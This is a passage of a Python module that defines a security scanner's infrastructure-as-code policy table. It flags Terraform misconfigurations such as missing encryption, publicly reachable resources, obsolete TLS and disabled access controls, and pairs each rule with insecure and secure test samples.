"""The infrastructure policy table.

Data, not code. Every entry is one control over one kind of resource, carrying
the two samples that decide whether it works: one block it must report and one
it must not. `tests/unit/test_iac_policies.py` runs both for every policy on
every push, so a policy that stops matching fails the build rather than quietly
reporting nothing -- the same discipline the YAML rule packs get from
`cordon-scanner rules test`.

Most entries come from a *family*: one control expressed once and applied to
every resource that has it. "Encryption at rest is not enabled" is one sentence
and thirty resources, and writing it thirty times would mean thirty chances to
write it differently. The family builders below take the resource, the attribute
that provider actually names, and a severity, and produce the policy, its
identifier, its message and its samples from that row. Adding a resource is a
line of data.

Two shapes, and the distinction is what makes this detector worth having:

`require`
    The block does not say something it must. `storage_encrypted = true` absent
    from an `aws_db_instance` means the database is unencrypted, because that is
    the provider's default -- a fact no file-level regex can see, since there is
    nothing written down to match.

`forbid`
    The block says something insecure outright: `acl = "public-read"`,
    `privileged: true`, `container_access_type = "container"`.

A `require` policy is only correct when the attribute belongs to the block it is
required in. Where a provider moved a setting into its own resource -- S3
encryption, S3 public access -- the policy is written against that resource
instead, because requiring it inside the bucket would report every modern
configuration as insecure.
"""

from __future__ import annotations

import functools
import gzip
import hashlib
import json
from pathlib import Path
from typing import Any, Final

from cordon_scanner.core.models import Category, Confidence, Severity
from cordon_scanner.detect.iac import IacPolicy

_HIGH = Severity.HIGH
_MEDIUM = Severity.MEDIUM
_LOW = Severity.LOW


def _slug(resource: str) -> str:
    """`aws_db_instance` -> `AWS_DB_INSTANCE`, for a readable rule id."""
    return resource.replace(":", "_").replace("-", "_").replace(".", "_").upper()


def _require_true(
    *,
    family: str,
    resource: str,
    attribute: str,
    severity: Severity,
    subject: str,
    consequence: str,
    extra_body: str = "",
    unless: tuple[str, ...] = (),
) -> IacPolicy:
    """A boolean the provider defaults to the insecure value.

    Fires when the attribute is absent as well as when it is `false`, because
    those are the same deployment. The sample pair is generated from the row, so
    a policy cannot be added without one that proves it and one that clears it.
    """
    return IacPolicy(
        id=f"POLICY.IAC.{family}.{_slug(resource)}.001",
        title=f"{resource}: {subject} is not enabled",
        message=(
            f"{subject} is not enabled on this resource. {consequence} The "
            f"provider's default for `{attribute}` is the insecure one, so a "
            f"block that does not mention it is a block that does not have it."
        ),
        remediation=f"Set `{attribute} = true` on this resource.",
        severity=severity,
        confidence=Confidence.HIGH,
        category=Category.POLICY,
        resources=(resource,),
        require=(rf"{attribute}\s*=\s*true",),
        unless=unless,
        bad=f'  name = "example"\n{extra_body}',
        good=f'  name = "example"\n  {attribute} = true\n{extra_body}',
    )


def _forbid_value(
    *,
    family: str,
    resource: str,
    attribute: str,
    pattern: str,
    severity: Severity,
    title: str,
    message: str,
    remediation: str,
    bad: str,
    good: str,
    category: Category = Category.POLICY,
    confidence: Confidence = Confidence.HIGH,
    unless: tuple[str, ...] = (),
) -> IacPolicy:
    """A value that is insecure where it is written."""
    return IacPolicy(
        id=f"{'SUSPECT' if category is Category.SUSPICIOUS else 'POLICY'}"
        f".IAC.{family}.{_slug(resource)}.001",
        title=title,
        message=message,
        remediation=remediation,
        severity=severity,
        confidence=confidence,
        category=category,
        resources=(resource,),
        forbid=(pattern,),
        unless=unless,
        bad=bad,
        good=good,
    )


# ---------------------------------------------------------------------------
# Encryption at rest, where the provider defaults to none
# ---------------------------------------------------------------------------
#
# Each row is a resource and the attribute that provider names for it. The
# consequence sentence is shared because it is the same consequence: the storage
# exists in plaintext on somebody else's disk, and the only control over who
# reads it is the platform's own access policy.

_AT_REST_CONSEQUENCE = (
    "The data is stored unencrypted, so anything that reaches the underlying "
    "storage -- a snapshot copied to another account, a disk reattached, an "
    "operator with platform access -- reads it directly."
)

_AT_REST: tuple[tuple[str, str, Severity], ...] = (
    ("aws_db_instance", "storage_encrypted", _HIGH),
    ("aws_rds_cluster", "storage_encrypted", _HIGH),
    ("aws_rds_global_cluster", "storage_encrypted", _MEDIUM),
    ("aws_docdb_cluster", "storage_encrypted", _HIGH),
    ("aws_neptune_cluster", "storage_encrypted", _HIGH),
    ("aws_ebs_volume", "encrypted", _HIGH),
    ("aws_efs_file_system", "encrypted", _HIGH),
    ("aws_fsx_lustre_file_system", "kms_key_id", _MEDIUM),
    ("aws_elasticache_replication_group", "at_rest_encryption_enabled", _MEDIUM),
    ("aws_redshift_cluster", "encrypted", _HIGH),
    ("aws_dax_cluster", "server_side_encryption", _MEDIUM),
    ("aws_qldb_ledger", "kms_key", _LOW),
    ("aws_timestreamwrite_database", "kms_key_id", _LOW),
    ("aws_codebuild_project", "encryption_key", _LOW),
    ("aws_sagemaker_endpoint_configuration", "kms_key_arn", _MEDIUM),
    ("aws_sagemaker_notebook_instance", "kms_key_id", _MEDIUM),
    ("aws_workspaces_workspace", "root_volume_encryption_enabled", _MEDIUM),
    ("aws_ecr_repository", "encryption_configuration", _LOW),
    ("aws_backup_vault", "kms_key_arn", _MEDIUM),
    ("aws_eks_cluster", "encryption_config", _MEDIUM),
    ("google_sql_database_instance", "encryption_key_name", _LOW),
    ("google_bigquery_dataset", "default_encryption_configuration", _LOW),
    ("google_dataproc_cluster", "encryption_config", _LOW),
    ("azurerm_managed_disk", "encryption_settings", _MEDIUM),
    ("azurerm_mysql_server", "infrastructure_encryption_enabled", _MEDIUM),
    ("azurerm_postgresql_server", "infrastructure_encryption_enabled", _MEDIUM),
)

# The attribute is a key reference rather than a boolean for several of these,
# and "absent" is still the question -- so the required pattern is the attribute
# being set to anything at all.
_AT_REST_NON_BOOLEAN = frozenset(
    {
        "kms_key_id",
        "kms_key_arn",
        "kms_key",
        "encryption_key",
        "encryption_key_name",
        "encryption_config",
        "encryption_configuration",
        "encryption_settings",
        "server_side_encryption",
        "default_encryption_configuration",
    }
)


def _at_rest_policies() -> list[IacPolicy]:
    policies: list[IacPolicy] = []
    for resource, attribute, severity in _AT_REST:
        if attribute in _AT_REST_NON_BOOLEAN:
            policies.append(
                IacPolicy(
                    id=f"POLICY.IAC.ENCRYPT_AT_REST.{_slug(resource)}.001",
                    title=f"{resource}: encryption at rest is not configured",
                    message=(
                        f"No `{attribute}` is configured on this resource. {_AT_REST_CONSEQUENCE}"
                    ),
                    remediation=(
                        f"Set `{attribute}` on this resource, referring to a key you "
                        f"control rather than relying on the platform default."
                    ),
                    severity=severity,
                    confidence=Confidence.MEDIUM,
                    category=Category.POLICY,
                    resources=(resource,),
                    require=(rf"{attribute}\s*[=:]",),
                    bad='  name = "example"\n',
                    good=f'  name = "example"\n  {attribute} = aws_kms_key.this.arn\n',
                )
            )
            continue
        policies.append(
            _require_true(
                family="ENCRYPT_AT_REST",
                resource=resource,
                attribute=attribute,
                severity=severity,
                subject="Encryption at rest",
                consequence=_AT_REST_CONSEQUENCE,
            )
        )
    return policies


# ---------------------------------------------------------------------------
# Encryption in transit
# ---------------------------------------------------------------------------

_IN_TRANSIT_CONSEQUENCE = (
    "Traffic to this resource is readable and modifiable by anything on the "
    "path between the client and it, which includes every network the provider "
    "routes it over."
)

_IN_TRANSIT: tuple[tuple[str, str, Severity], ...] = (
    ("aws_elasticache_replication_group", "transit_encryption_enabled", _HIGH),
    ("aws_dms_endpoint", "ssl_mode", _MEDIUM),
    ("aws_efs_file_system_policy", "policy", _LOW),
    ("azurerm_storage_account", "enable_https_traffic_only", _HIGH),
    ("azurerm_postgresql_server", "ssl_enforcement_enabled", _HIGH),
    ("azurerm_mysql_server", "ssl_enforcement_enabled", _HIGH),
    ("azurerm_mariadb_server", "ssl_enforcement_enabled", _HIGH),
    ("azurerm_app_service", "https_only", _MEDIUM),
    ("azurerm_linux_web_app", "https_only", _MEDIUM),
    ("azurerm_windows_web_app", "https_only", _MEDIUM),
    ("azurerm_function_app", "https_only", _MEDIUM),
    ("azurerm_linux_function_app", "https_only", _MEDIUM),
    ("azurerm_windows_function_app", "https_only", _MEDIUM),
)


def _in_transit_policies() -> list[IacPolicy]:
    policies: list[IacPolicy] = []
    for resource, attribute, severity in _IN_TRANSIT:
        if attribute in {"ssl_mode", "policy"}:
            continue
        policies.append(
            _require_true(
                family="ENCRYPT_IN_TRANSIT",
                resource=resource,
                attribute=attribute,
                severity=severity,
                subject="Encryption in transit",
                consequence=_IN_TRANSIT_CONSEQUENCE,
            )
        )
    return policies


# ---------------------------------------------------------------------------
# Reachable from the whole internet
# ---------------------------------------------------------------------------

_PUBLIC_CONSEQUENCE = (
    "The resource is reachable from the public internet, so its own "
    "authentication is the only thing between an anonymous scanner and the data "
    "behind it -- and scanning for exactly this is continuous and automated."
)

_PUBLIC_TRUE: tuple[tuple[str, str, Severity], ...] = (
    ("aws_db_instance", "publicly_accessible", _HIGH),
    ("aws_rds_cluster_instance", "publicly_accessible", _HIGH),
    ("aws_redshift_cluster", "publicly_accessible", _HIGH),
    ("aws_docdb_cluster_instance", "publicly_accessible", _HIGH),
    ("aws_dms_replication_instance", "publicly_accessible", _MEDIUM),
    ("aws_sagemaker_notebook_instance", "direct_internet_access", _MEDIUM),
    ("azurerm_mssql_server", "public_network_access_enabled", _MEDIUM),
    ("azurerm_postgresql_server", "public_network_access_enabled", _MEDIUM),
    ("azurerm_mysql_server", "public_network_access_enabled", _MEDIUM),
    ("azurerm_cosmosdb_account", "public_network_access_enabled", _MEDIUM),
    ("azurerm_key_vault", "public_network_access_enabled", _MEDIUM),
    ("azurerm_container_registry", "public_network_access_enabled", _LOW),
    ("azurerm_storage_account", "public_network_access_enabled", _MEDIUM),
    ("azurerm_redis_cache", "public_network_access_enabled", _MEDIUM),
)


def _public_policies() -> list[IacPolicy]:
    policies: list[IacPolicy] = []
    for resource, attribute, severity in _PUBLIC_TRUE:
        # Two spellings of the same setting: a boolean on most resources, and
        # the word "Enabled" on the SageMaker one.
        worded = attribute == "direct_internet_access"
        insecure = '"Enabled"' if worded else "true"
        secure = '"Disabled"' if worded else "false"
        policies.append(
            _forbid_value(
                family="PUBLIC_ACCESS",
                resource=resource,
                attribute=attribute,
                pattern=rf"{attribute}\s*=\s*" + ('"Enabled"' if worded else "true"),
                severity=severity,
                title=f"{resource}: reachable from the public internet",
                message=f"`{attribute}` is set on this resource. {_PUBLIC_CONSEQUENCE}",
                remediation=(
                    f"Set `{attribute} = {secure}` and reach the resource over a "
                    f"private endpoint or a peered network."
                ),
                bad=f'  name = "example"\n  {attribute} = {insecure}\n',
                good=f'  name = "example"\n  {attribute} = {secure}\n',
                category=Category.SUSPICIOUS,
            )
        )
    return policies


# ---------------------------------------------------------------------------
# Logging, auditing and backup, where the provider defaults to off
# ---------------------------------------------------------------------------

_LOGGING_CONSEQUENCE = (
    "Nothing records what happened here, so an incident involving this resource "
    "cannot be reconstructed afterwards -- and the absence is only ever "
    "discovered when somebody goes looking for the records."
)

_LOGGING: tuple[tuple[str, str, Severity], ...] = (
    ("aws_cloudtrail", "enable_log_file_validation", _MEDIUM),
    ("aws_cloudtrail", "is_multi_region_trail", _MEDIUM),
    ("aws_redshift_cluster", "logging", _LOW),
    ("aws_elasticsearch_domain", "log_publishing_options", _LOW),
    ("aws_opensearch_domain", "log_publishing_options", _LOW),
    ("aws_api_gateway_stage", "xray_tracing_enabled", _LOW),
    ("aws_docdb_cluster", "enabled_cloudwatch_logs_exports", _LOW),
    ("aws_neptune_cluster", "enable_cloudwatch_logs_exports", _LOW),
    ("aws_msk_cluster", "logging_info", _LOW),
    ("google_container_cluster", "logging_service", _LOW),
    ("google_storage_bucket", "logging", _LOW),
    ("azurerm_mssql_server", "extended_auditing_policy", _MEDIUM),
)

_BACKUP: tuple[tuple[str, str, Severity], ...] = (
    ("aws_db_instance", "backup_retention_period", _MEDIUM),
    ("aws_rds_cluster", "backup_retention_period", _MEDIUM),
    ("aws_docdb_cluster", "backup_retention_period", _LOW),
    ("aws_neptune_cluster", "backup_retention_period", _LOW),
    ("aws_redshift_cluster", "automated_snapshot_retention_period", _LOW),
    ("azurerm_postgresql_server", "backup_retention_days", _LOW),
    ("azurerm_mysql_server", "backup_retention_days", _LOW),
)

_DELETION_PROTECTION: tuple[tuple[str, str, Severity], ...] = (
    ("aws_db_instance", "deletion_protection", _LOW),
    ("aws_rds_cluster", "deletion_protection", _LOW),
    ("aws_docdb_cluster", "deletion_protection", _LOW),
    ("aws_neptune_cluster", "deletion_protection", _LOW),
    ("aws_lb", "enable_deletion_protection", _LOW),
    ("aws_alb", "enable_deletion_protection", _LOW),
    ("aws_dynamodb_table", "deletion_protection_enabled", _LOW),
    ("azurerm_key_vault", "purge_protection_enabled", _MEDIUM),
)


def _presence_policies(
    rows: tuple[tuple[str, str, Severity], ...],
    *,
    family: str,
    subject: str,
    consequence: str,
    remediation: str,
) -> list[IacPolicy]:
    """One policy per row, fired by the attribute being absent from the block."""
    policies: list[IacPolicy] = []
    for resource, attribute, severity in rows:
        policies.append(
            IacPolicy(
                id=f"POLICY.IAC.{family}.{_slug(resource)}_{attribute.upper()}.001",
                title=f"{resource}: {subject} is not configured",
                message=(f"This resource does not configure `{attribute}`. {consequence}"),
                remediation=remediation.format(attribute=attribute),
                severity=severity,
                confidence=Confidence.MEDIUM,
                category=Category.POLICY,
                resources=(resource,),
                require=(rf"{attribute}\s*[=:]",),
                bad='  name = "example"\n',
                good=f'  name = "example"\n  {attribute} = 7\n',
            )
        )
    return policies


def _zero_retention_policies() -> list[IacPolicy]:
    """Retention explicitly set to nothing, which is the same as no backup."""
    policies: list[IacPolicy] = []
    for resource, attribute, severity in _BACKUP:
        policies.append(
            _forbid_value(
                family="BACKUP_DISABLED",
                resource=resource,
                attribute=attribute,
                pattern=rf"{attribute}\s*=\s*0\b",
                severity=severity,
                title=f"{resource}: backups are switched off",
                message=(
                    f"`{attribute} = 0` disables automated backups entirely. A "
                    f"deletion, a corruption or a ransom event leaves nothing to "
                    f"restore from, and the setting reads as configured rather than "
                    f"forgotten."
                ),
                remediation=f"Set `{attribute}` to the number of days the data is worth.",
                bad=f'  name = "example"\n  {attribute} = 0\n',
                good=f'  name = "example"\n  {attribute} = 7\n',
            )
        )
    return policies


# ---------------------------------------------------------------------------
# Object storage open to the world
# ---------------------------------------------------------------------------

_OPEN_STORAGE: tuple[tuple[str, str, str, Severity, str, str], ...] = (
    (
        "aws_s3_bucket",
        "acl",
        r"acl\s*=\s*\"public-read(-write)?\"",
        _HIGH,
        '  bucket = "example"\n  acl = "public-read"\n',
        '  bucket = "example"\n  acl = "private"\n',
    ),
    (
        "aws_s3_bucket_acl",
        "acl",
        r"acl\s*=\s*\"public-read(-write)?\"",
        _HIGH,
        '  bucket = aws_s3_bucket.b.id\n  acl = "public-read-write"\n',
        '  bucket = aws_s3_bucket.b.id\n  acl = "private"\n',
    ),
    (
        "azurerm_storage_container",
        "container_access_type",
        r"container_access_type\s*=\s*\"(?:blob|container)\"",
        _HIGH,
        '  name = "example"\n  container_access_type = "container"\n',
        '  name = "example"\n  container_access_type = "private"\n',
    ),
    (
        "azurerm_storage_account",
        "allow_nested_items_to_be_public",
        r"allow_nested_items_to_be_public\s*=\s*true",
        _MEDIUM,
        '  name = "example"\n  allow_nested_items_to_be_public = true\n',
        '  name = "example"\n  allow_nested_items_to_be_public = false\n',
    ),
    (
        "google_storage_bucket_iam_member",
        "member",
        r"member\s*=\s*\"all(?:Users|AuthenticatedUsers)\"",
        _HIGH,
        '  bucket = "example"\n  member = "allUsers"\n',
        '  bucket = "example"\n  member = "user:someone@example.com"\n',
    ),
    (
        "google_storage_bucket_iam_binding",
        "members",
        r"\"all(?:Users|AuthenticatedUsers)\"",
        _HIGH,
        '  bucket = "example"\n  members = ["allUsers"]\n',
        '  bucket = "example"\n  members = ["group:team@example.com"]\n',
    ),
    (
        "google_storage_bucket_access_control",
        "entity",
        r"entity\s*=\s*\"allUsers\"",
        _HIGH,
        '  bucket = "example"\n  entity = "allUsers"\n',
        '  bucket = "example"\n  entity = "user-someone@example.com"\n',
    ),
)


def _open_storage_policies() -> list[IacPolicy]:
    policies: list[IacPolicy] = []
    for resource, attribute, pattern, severity, bad, good in _OPEN_STORAGE:
        policies.append(
            _forbid_value(
                family="PUBLIC_STORAGE",
                resource=resource,
                attribute=attribute,
                pattern=pattern,
                severity=severity,
                title=f"{resource}: storage is readable by anyone",
                message=(
                    "This grants read access to the whole internet. Object storage "
                    "left open is the single most common cause of a public data "
                    "breach, and it is found by continuous automated scanning within "
                    "hours rather than by anyone who meant to look."
                ),
                remediation=(
                    "Grant access to named principals, and serve public content "
                    "through a CDN origin identity rather than by opening the bucket."
                ),
                bad=bad,
                good=good,
                category=Category.SUSPICIOUS,
            )
        )
    return policies


# ---------------------------------------------------------------------------
# Public access blocks that are switched off
# ---------------------------------------------------------------------------

_PUBLIC_ACCESS_BLOCK = (
    "block_public_acls",
    "block_public_policy",
    "ignore_public_acls",
    "restrict_public_buckets",
)


def _public_access_block_policies() -> list[IacPolicy]:
    policies: list[IacPolicy] = []
    for attribute in _PUBLIC_ACCESS_BLOCK:
        policies.append(
            IacPolicy(
                id=f"SUSPECT.IAC.PUBLIC_ACCESS_BLOCK.{attribute.upper()}.001",
                title=f"aws_s3_bucket_public_access_block: {attribute} is off",
                message=(
                    f"`{attribute}` is false, so the account-level guard that exists "
                    f"to stop a bucket becoming public does not apply here. The "
                    f"resource is named for blocking public access and is configured "
                    f"not to."
                ),
                remediation=f"Set `{attribute} = true` unless the bucket serves public content deliberately.",
                severity=_HIGH,
                confidence=Confidence.HIGH,
                category=Category.SUSPICIOUS,
                resources=("aws_s3_bucket_public_access_block",),
                forbid=(rf"{attribute}\s*=\s*false",),
                bad=f"  bucket = aws_s3_bucket.b.id\n  {attribute} = false\n",
                good=f"  bucket = aws_s3_bucket.b.id\n  {attribute} = true\n",
            )
        )
    return policies


# ---------------------------------------------------------------------------
# Weak or absent transport security
# ---------------------------------------------------------------------------

_WEAK_TLS: tuple[tuple[str, str, str, Severity, str, str], ...] = (
    (
        "azurerm_storage_account",
        "min_tls_version",
        r"min_tls_version\s*=\s*\"TLS1_[01]\"",
        _MEDIUM,
        '  name = "example"\n  min_tls_version = "TLS1_0"\n',
        '  name = "example"\n  min_tls_version = "TLS1_2"\n',
    ),
    (
        "azurerm_mssql_server",
        "minimum_tls_version",
        r"minimum_tls_version\s*=\s*\"1\.[01]\"",
        _MEDIUM,
        '  name = "example"\n  minimum_tls_version = "1.0"\n',
        '  name = "example"\n  minimum_tls_version = "1.2"\n',
    ),
    (
        "azurerm_app_service",
        "min_tls_version",
        r"min_tls_version\s*=\s*\"1\.[01]\"",
        _MEDIUM,
        '  name = "example"\n  site_config {\n    min_tls_version = "1.0"\n  }\n',
        '  name = "example"\n  site_config {\n    min_tls_version = "1.2"\n  }\n',
    ),
    (
        "azurerm_redis_cache",
        "minimum_tls_version",
        r"minimum_tls_version\s*=\s*\"1\.[01]\"",
        _MEDIUM,
        '  name = "example"\n  minimum_tls_version = "1.0"\n',
        '  name = "example"\n  minimum_tls_version = "1.2"\n',
    ),
    (
        "aws_lb_listener",
        "ssl_policy",
        r"ssl_policy\s*=\s*\"[^\"]*TLS-1-[01][^\"]*\"",
        _MEDIUM,
        '  port = 443\n  ssl_policy = "ELBSecurityPolicy-TLS-1-0-2015-04"\n',
        '  port = 443\n  ssl_policy = "ELBSecurityPolicy-TLS13-1-2-2021-06"\n',
    ),
    (
        "aws_api_gateway_domain_name",
        "security_policy",
        r"security_policy\s*=\s*\"TLS_1_0\"",
        _MEDIUM,
        '  domain_name = "api.example.com"\n  security_policy = "TLS_1_0"\n',
        '  domain_name = "api.example.com"\n  security_policy = "TLS_1_2"\n',
    ),
    (
        "google_compute_ssl_policy",
        "min_tls_version",
        r"min_tls_version\s*=\s*\"TLS_1_0\"",
        _MEDIUM,
        '  name = "example"\n  min_tls_version = "TLS_1_0"\n',
        '  name = "example"\n  min_tls_version = "TLS_1_2"\n',
    ),
)


def _weak_tls_policies() -> list[IacPolicy]:
    policies: list[IacPolicy] = []
    for resource, attribute, pattern, severity, bad, good in _WEAK_TLS:
        policies.append(
            _forbid_value(
                family="WEAK_TLS",
                resource=resource,
                attribute=attribute,
                pattern=pattern,
                severity=severity,
                title=f"{resource}: obsolete TLS version accepted",
                message=(
                    "This accepts TLS 1.0 or 1.1. Both are withdrawn, both have "
                    "practical attacks against them, and a client that negotiates one "
                    "gets a connection that looks encrypted in every log while not "
                    "being worth the label."
                ),
                remediation="Require TLS 1.2 or later.",
                bad=bad,
                good=good,
            )
        )
    return policies


# ---------------------------------------------------------------------------
# Plaintext and unauthenticated endpoints
# ---------------------------------------------------------------------------

_PLAINTEXT: tuple[IacPolicy, ...] = (
    IacPolicy(
        id="SUSPECT.IAC.PLAINTEXT.AWS_LB_LISTENER.001",
        title="aws_lb_listener: traffic is served over plain HTTP",
        message=(
            "A load balancer listener serves HTTP rather than HTTPS. Everything it "
            "carries -- session cookies, tokens in headers, request bodies -- is "
            "readable and modifiable by anything on the path."
        ),
        remediation=(
            "Serve HTTPS, and keep an HTTP listener only if it does nothing but redirect to it."
        ),
        severity=_MEDIUM,
        confidence=Confidence.MEDIUM,
        category=Category.SUSPICIOUS,
        resources=("aws_lb_listener", "aws_alb_listener"),
        forbid=(r"protocol\s*=\s*\"HTTP\"",),
        # A listener whose only action is a redirect to HTTPS is the remediation
        # this policy asks for, not the thing it is about.
        unless=(r"type\s*=\s*\"redirect\"", r"protocol\s*=\s*\"HTTPS\""),
        bad='  port = 80\n  protocol = "HTTP"\n  default_action {\n    type = "forward"\n  }\n',
        good='  port = 80\n  protocol = "HTTP"\n  default_action {\n    type = "redirect"\n  }\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.PLAINTEXT.AWS_MSK_CLUSTER.001",
        title="aws_msk_cluster: brokers accept plaintext client connections",
        message=(
            '`client_broker = "PLAINTEXT"` lets clients talk to the brokers with no '
            "transport encryption at all, so every message and every credential in a "
            "connection handshake crosses the network in the clear."
        ),
        remediation='Set `client_broker = "TLS"` in the encryption_in_transit block.',
        severity=_HIGH,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("aws_msk_cluster",),
        forbid=(r"client_broker\s*=\s*\"PLAINTEXT\"",),
        bad='  cluster_name = "example"\n  encryption_info {\n    encryption_in_transit {\n      client_broker = "PLAINTEXT"\n    }\n  }\n',
        good='  cluster_name = "example"\n  encryption_info {\n    encryption_in_transit {\n      client_broker = "TLS"\n    }\n  }\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.PLAINTEXT.AZURERM_REDIS_CACHE.001",
        title="azurerm_redis_cache: the non-TLS port is open",
        message=(
            "`enable_non_ssl_port = true` exposes Redis on its plaintext port. Redis "
            "authenticates with a shared key sent on that connection, so the key and "
            "everything it protects cross the network readable."
        ),
        remediation="Set `enable_non_ssl_port = false` and connect over TLS.",
        severity=_HIGH,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("azurerm_redis_cache",),
        forbid=(r"enable_non_ssl_port\s*=\s*true",),
        bad='  name = "example"\n  enable_non_ssl_port = true\n',
        good='  name = "example"\n  enable_non_ssl_port = false\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.NO_AUTH.AWS_API_GATEWAY_METHOD.001",
        title="aws_api_gateway_method: the method is unauthenticated",
        message=(
            '`authorization = "NONE"` publishes this method with no authentication '
            "in front of it. Whatever it reaches -- a Lambda, a VPC link, a database "
            "behind either -- is callable by anyone who finds the URL."
        ),
        remediation=(
            "Use an authorizer, IAM authorisation or an API key, or state in the "
            "configuration why this method is deliberately public."
        ),
        severity=_MEDIUM,
        confidence=Confidence.MEDIUM,
        category=Category.SUSPICIOUS,
        resources=("aws_api_gateway_method",),
        forbid=(r"authorization\s*=\s*\"NONE\"",),
        # An OPTIONS method answers a CORS preflight and cannot carry
        # authentication by design.
        unless=(r"http_method\s*=\s*\"OPTIONS\"", r"api_key_required\s*=\s*true"),
        bad='  http_method = "POST"\n  authorization = "NONE"\n',
        good='  http_method = "POST"\n  authorization = "AWS_IAM"\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.IMDSV1.AWS_INSTANCE.001",
        title="aws_instance: instance metadata is reachable without a token",
        message=(
            '`http_tokens = "optional"` leaves IMDSv1 enabled, so any process on the '
            "instance -- and any server-side request forgery in an application on it "
            "-- can read the instance profile's credentials with a plain GET."
        ),
        remediation='Set `http_tokens = "required"` in the metadata_options block.',
        severity=_MEDIUM,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("aws_instance", "aws_launch_template", "aws_launch_configuration"),
        forbid=(r"http_tokens\s*=\s*\"optional\"",),
        bad='  ami = "ami-123"\n  metadata_options {\n    http_tokens = "optional"\n  }\n',
        good='  ami = "ami-123"\n  metadata_options {\n    http_tokens = "required"\n  }\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.PUBLIC_SQL.GOOGLE_SQL_DATABASE_INSTANCE.001",
        title="google_sql_database_instance: authorised network is the whole internet",
        message=(
            "An authorised network of `0.0.0.0/0` places the database's own "
            "authentication in front of the entire internet. Cloud SQL instances are "
            "scanned for continuously."
        ),
        remediation=(
            "Authorise the specific networks that need it, or use a private IP and "
            "the Cloud SQL proxy."
        ),
        severity=_HIGH,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("google_sql_database_instance",),
        forbid=(r"value\s*=\s*\"0\.0\.0\.0/0\"",),
        bad='  name = "example"\n  settings {\n    ip_configuration {\n      authorized_networks {\n        value = "0.0.0.0/0"\n      }\n    }\n  }\n',
        good='  name = "example"\n  settings {\n    ip_configuration {\n      authorized_networks {\n        value = "10.0.0.0/8"\n      }\n    }\n  }\n',
    ),
    IacPolicy(
        id="POLICY.IAC.SQL_REQUIRE_SSL.GOOGLE_SQL_DATABASE_INSTANCE.001",
        title="google_sql_database_instance: SSL is not required",
        message=(
            "The instance does not require SSL, so a client that does not ask for it "
            "gets a plaintext connection carrying the database credentials."
        ),
        remediation="Set `require_ssl = true` in the ip_configuration block.",
        severity=_MEDIUM,
        confidence=Confidence.MEDIUM,
        category=Category.POLICY,
        resources=("google_sql_database_instance",),
        require=(
            r"require_ssl\s*=\s*true",
            r"ssl_mode\s*=",
        ),
        bad='  name = "example"\n  settings {\n    ip_configuration {\n      ipv4_enabled = true\n    }\n  }\n',
        good='  name = "example"\n  settings {\n    ip_configuration {\n      require_ssl = true\n    }\n  }\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.ADMIN_ENABLED.AZURERM_CONTAINER_REGISTRY.001",
        title="azurerm_container_registry: the shared admin account is enabled",
        message=(
            "`admin_enabled = true` turns on a single shared username and password "
            "for the whole registry. It cannot be scoped, it is not attributable to a "
            "person, and it is the credential that ends up in a CI variable."
        ),
        remediation=(
            "Leave the admin account off and authenticate with a service principal or "
            "a managed identity."
        ),
        severity=_MEDIUM,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("azurerm_container_registry",),
        forbid=(r"admin_enabled\s*=\s*true",),
        bad='  name = "example"\n  admin_enabled = true\n',
        good='  name = "example"\n  admin_enabled = false\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.LEGACY_ABAC.GOOGLE_CONTAINER_CLUSTER.001",
        title="google_container_cluster: legacy ABAC authorisation is enabled",
        message=(
            "Legacy ABAC grants broad permissions to every node and every workload in "
            "the cluster, bypassing the RBAC model entirely. A pod that can reach the "
            "API server inherits it."
        ),
        remediation="Set `enable_legacy_abac = false` and grant access through RBAC.",
        severity=_HIGH,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("google_container_cluster",),
        forbid=(r"enable_legacy_abac\s*=\s*true",),
        bad='  name = "example"\n  enable_legacy_abac = true\n',
        good='  name = "example"\n  enable_legacy_abac = false\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.RBAC_DISABLED.AZURERM_KUBERNETES_CLUSTER.001",
        title="azurerm_kubernetes_cluster: role-based access control is disabled",
        message=(
            "With RBAC off, every authenticated client of the API server has full "
            "access to the cluster, and a token taken from any pod is a token for all "
            "of it."
        ),
        remediation="Set `role_based_access_control_enabled = true`.",
        severity=_HIGH,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("azurerm_kubernetes_cluster",),
        forbid=(r"role_based_access_control_enabled\s*=\s*false",),
        bad='  name = "example"\n  role_based_access_control_enabled = false\n',
        good='  name = "example"\n  role_based_access_control_enabled = true\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.PASSWORD_AUTH.AZURERM_LINUX_VIRTUAL_MACHINE.001",
        title="azurerm_linux_virtual_machine: password authentication is enabled",
        message=(
            "`disable_password_authentication = false` allows SSH password login. A "
            "password is guessable at internet scale, and a Linux VM with a public "
            "address receives that traffic continuously."
        ),
        remediation="Leave password authentication disabled and use SSH keys.",
        severity=_MEDIUM,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("azurerm_linux_virtual_machine", "azurerm_virtual_machine"),
        forbid=(r"disable_password_authentication\s*=\s*false",),
        bad='  name = "example"\n  disable_password_authentication = false\n',
        good='  name = "example"\n  disable_password_authentication = true\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.SERIAL_PORT.GOOGLE_COMPUTE_INSTANCE.001",
        title="google_compute_instance: the interactive serial console is enabled",
        message=(
            "`serial-port-enable` exposes an interactive console that bypasses the "
            "instance's own network controls and firewall rules, reachable with "
            "project-level credentials."
        ),
        remediation="Remove the metadata entry, or set it to FALSE.",
        severity=_MEDIUM,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("google_compute_instance", "google_compute_instance_template"),
        forbid=(r"serial-port-enable\s*=\s*\"?(?:true|TRUE|1)\"?",),
        bad='  name = "example"\n  metadata = {\n    serial-port-enable = "true"\n  }\n',
        good='  name = "example"\n  metadata = {\n    serial-port-enable = "false"\n  }\n',
    ),
    IacPolicy(
